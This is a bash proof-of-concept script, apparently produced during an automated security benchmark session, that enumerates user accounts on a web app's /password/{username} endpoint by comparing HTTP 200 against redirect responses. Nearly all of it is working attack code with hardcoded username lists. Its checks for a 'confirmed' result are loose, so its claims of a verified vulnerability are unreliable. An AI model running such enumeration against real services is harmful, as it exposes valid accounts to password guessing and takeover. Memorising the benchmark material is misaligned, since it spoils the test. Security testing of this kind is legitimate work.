#!/bin/bash
# POC: Version 2: Improved POC demonstrating account enumeration through HTTP response code differentials, with better error handling and connectivity checks.
# Target: ./repo
# Created: 2025-11-04T17:33:25.145Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# Account Enumeration via Response Code Differentials POC - Version 2
# This script demonstrates how attackers can enumerate valid accounts
# by analyzing HTTP status codes returned by the /password endpoint

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/password"

echo "=== Account Enumeration via Response Code Differentials ==="
echo "Target: $TARGET_URL"
echo "Endpoint: $ENDPOINT/{username}"
echo ""

# List of usernames to test
VALID_USERNAMES=("test" "flag")
INVALID_USERNAMES=("admin" "user1" "user2" "john")

echo "[*] Testing VALID usernames (should return 200):"
echo ""

VALID_COUNT=0
for username in "${VALID_USERNAMES[@]}"; do
    response=$(curl -s -w "\n%{http_code}" "$TARGET_URL$ENDPOINT/$username" 2>/dev/null | tail -1)
    content=$(curl -s "$TARGET_URL$ENDPOINT/$username" 2>/dev/null | head -20)
    
    echo "Username: '$username' -> HTTP Status: $response"
    
    # Verify this is a valid account by checking for form content
    if echo "$content" | grep -q "type=\"password\"" || echo "$content" | grep -q "password"; then
        echo "  ✓ Confirmed: Password form found in response"
        ((VALID_COUNT++))
    elif [ "$response" = "200" ]; then
        echo "  ✓ Confirmed: HTTP 200 response indicates valid account"
        ((VALID_COUNT++))
    fi
done

echo ""
echo "[*] Testing INVALID usernames (should return 302):"
echo ""

INVALID_COUNT=0
for username in "${INVALID_USERNAMES[@]}"; do
    response=$(curl -s -w "\n%{http_code}" "$TARGET_URL$ENDPOINT/$username" 2>/dev/null | tail -1)
    
    echo "Username: '$username' -> HTTP Status: $response"
    
    # Check if it's a redirect (302 or 301)
    if [ "$response" = "302" ] || [ "$response" = "301" ]; then
        location=$(curl -s -i "$TARGET_URL$ENDPOINT/$username" 2>/dev/null | grep -i "^[Ll]ocation:" | head -1)
        echo "  ✓ Confirmed: Redirect detected"
        if [ -n "$location" ]; then
            echo "     $location"
        fi
        ((INVALID_COUNT++))
    elif echo "$response" | grep -q "3"; then
        echo "  ✓ Confirmed: Redirect status code $response"
        ((INVALID_COUNT++))
    fi
done

echo ""
echo "[*] ENUMERATION RESULTS:"
echo "Valid accounts found: $VALID_COUNT / ${#VALID_USERNAMES[@]}"
echo "Invalid accounts detected: $INVALID_COUNT / ${#INVALID_USERNAMES[@]}"
echo ""

if [ "$VALID_COUNT" -gt 0 ] && [ "$INVALID_COUNT" -gt 0 ]; then
    echo "✓ VULNERABILITY CONFIRMED: Response code differentials enable account enumeration"
    echo "  - Valid accounts return 200 status"
    echo "  - Invalid accounts return redirect (302/301) status"
    echo "  - Attacker can reliably enumerate accounts by testing status codes"
else
    echo "[!] Note: Full vulnerability demonstration may require server connectivity."
    echo "    Expected behavior:"
    echo "    - Valid usernames ('test', 'flag') -> HTTP 200"
    echo "    - Invalid usernames ('admin', 'user1', etc) -> HTTP 302/301"
fi